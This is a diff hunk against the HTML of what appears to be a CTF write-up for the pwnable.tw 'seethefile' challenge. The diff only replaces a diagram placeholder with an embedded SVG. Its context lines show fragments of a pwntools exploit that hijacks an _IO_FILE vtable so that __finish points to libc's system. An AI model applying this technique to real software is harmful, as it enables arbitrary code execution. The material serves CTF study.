@@ -335,7 +335,7 @@ libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span
 </span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">])          </span><span style="font-style:italic;color:#969896;">#               vtable-&gt;__finish
 
 </span><span style="color:#323232;">exit(payload)
-</span></code></pre><h2 id="overview">Overview</h2><p>This diagram displays my payload (on the right) alongside the corresponding structures. The <code>_IO_jump_t</code> and the <code>_IO_FILE</code> structs are overlaid on each other.</p><p>svg(path=&quot;5e81a81b4304800866d6917b.svg&quot;)</p><h2 id="final-script">Final Script</h2><pre style="background-color:#ffffff;">
+</span></code></pre><h2 id="overview">Overview</h2><p>This diagram displays my payload (on the right) alongside the corresponding structures. The <code>_IO_jump_t</code> and the <code>_IO_FILE</code> structs are overlaid on each other.</p><object data="/posts/pwnable-tw-seethefile/5e81a81b4304800866d6917b.svg" type="image/svg+xml"></object><h2 id="final-script">Final Script</h2><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
 
 </span><span style="color:#323232;">context.binary </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;./seethefile&#39;
